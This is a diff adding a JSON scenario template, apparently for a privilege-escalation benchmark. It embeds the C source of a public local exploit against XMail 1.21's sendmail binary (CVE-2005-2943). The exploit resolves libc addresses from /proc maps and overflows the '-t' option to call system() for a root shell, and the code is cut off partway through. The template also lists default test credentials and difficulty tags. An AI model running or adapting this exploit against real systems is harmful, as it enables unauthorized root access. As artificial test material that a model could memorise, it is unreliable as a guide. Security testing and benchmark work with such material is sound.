@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_1267",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: XMail 1.21 - '-t' Command Line Option Local Buffer Overflow / Local Privilege Escalation (OSVDB-20010;CVE-2005-2943)\n\nExploit source code (1267.c):\n```\n/*\n* XMail 1.21 'sendmail' local exploit (ret-into-libc)\n* Yields uid root || gid mail\n* By qaaz [at] centrum [dot] cz, 2005\n*/\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <signal.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <sys/select.h>\n\n\n#define TARGET \"/var/MailRoot/bin/sendmail\"\n\n#define NM \"nm\"\n#define GREP \"grep\"\n#define MKDIR \"mkdir\"\n#define TMP \"/tmp\"\n#define MAILROOT TMP\"/mr\"\n\n#define ID \"/usr/bin/id\"\n#define SH \"/bin/sh\"\n\n#define OVERLEN (256+12 + 16)\n/* EmitRecipients() stack */\n/* | locals + padding + PUSHes | RET | Arg1... | */\n/* |<--------- OVERLEN ------->| */\n\n#define MAX(x,y) (((x)>(y)) ? (x) : (y))\n\nchar *libc_file = NULL;\nunsigned int libc_base = 0;\nunsigned int stack_base = 0;\n\nunsigned int file_addr = 0;\nunsigned int system_addr = 0;\n\nint pid;\nint pi[2], po[2], pe[2];\n\nvoid sigchild(int sig)\n{\nif (waitpid(pid, NULL, WNOHANG) == pid) {\nprintf(\"[*] Vuln terminated\\n\");\nexit(-1);\n}\n}\n\nvoid killchild()\n{\nif (pid) kill(pid, SIGKILL);\n}\n\nchar bad_chars(char *buf, int len)\n{\nint i;\nif (len == 0) len == strlen(buf);\nfor (i = 0; i < len; i++) {\nif (!buf[i] || strchr(\"<> \\t,\\\":;'\\r\\n\", buf[i]))\nreturn buf[i];\n}\nreturn 0;\n}\n\nunsigned int get_sym(char *lib, char *sym)\n{\nFILE *f;\nchar buf[1024];\nunsigned int val = 0;\n\nsprintf(buf, \"%s -D %s | %s -w %s\", NM, lib, GREP, sym);\nif (f = popen(buf, \"r\")) {\nfgets(buf, sizeof(buf), f);\nsscanf(buf, \"%08lx %*s %*s\", &val);\npclose(f);\n}\nreturn val;\n}\n\nunsigned int check_sym(char *lib, char *sym, unsigned int base)\n{\nunsigned int offs = get_sym(lib, sym);\nunsigned int addr = base + offs;\n\nif (!offs) {\nprintf(\"[-] %s: not found?\\n\", sym);\nreturn 0;\n}\nif (bad_chars((char *) &addr, 4)) {\nprintf(\"[-] %s: 0x%08x, bad chars\\n\", sym, addr);\nreturn 0;\n}\nprintf(\"[+] %s: 0x%08x\\n\", sym, addr);\nreturn addr;\n}\n\nvoid do_maps(int pid)\n{\nFILE *f;\nchar buf[1024];\n\nsprintf(buf, \"/proc/%d/maps\", pid);\nif (!(f = fopen(buf, \"r\"))) return;\n\nwhile (fgets(buf, sizeof(buf), f)) {\nunsigned int addr_beg, addr_end;\nchar pathname[1024];\nint offset;\n\npathname[0] = 0;\nsscanf(buf, \"%08lx-%08lx %*s %08lx %*s %*s %s\",\n&addr_beg, &addr_end, &offset, pathname);\n\nif (offset < 0)\nstack_base = addr_end;\nelse if (strstr(pathname, \"/libc\") && (!libc_base || addr_beg < libc_base))\nlibc_base = addr_beg, libc_file = (char *) strdup(pathname);\n}\nfclose(f);\n}\n\nvoid do_syms()\n{\nif (!(file_addr = check_sym(libc_file, \"stdout\", libc_base))\n&& !(file_addr = check_sym(libc_file, \"stderr\", libc_base))\n&& !(file_addr = check_sym(libc_file, \"stdin\", libc_base))) {\nprintf(\"[-] Can't use std files\\n\");\nexit(-1);\n}\n\nif (!(system_addr = check_sym(libc_file, \"system\", libc_base))) {\nprintf(\"[-] Can't use system()\\n\");\nexit(-1);\n}\n}\n\nvoid do_shell()\n{\nfd_set fds;\nstruct timeval tv;\nint retval, maxfd;\nchar buf[1024];\n\nmaxfd = MAX(0, MAX(po[0], pe[0])) + 1;\n\nwhile (1) {\nFD_ZERO(&fds);\nFD_SET(0, &fds);\nFD_SET(po[0], &fds);\nFD_SET(pe[0], &fds);\ntv.tv_sec = 0;\ntv.tv_usec = 100;\n\nif (select(maxfd, &fds, NU\n```",
+  "cve": "OSVDB-20010;CVE-2005-2943",
+  "exploitdb_id": "1267",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_1267",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
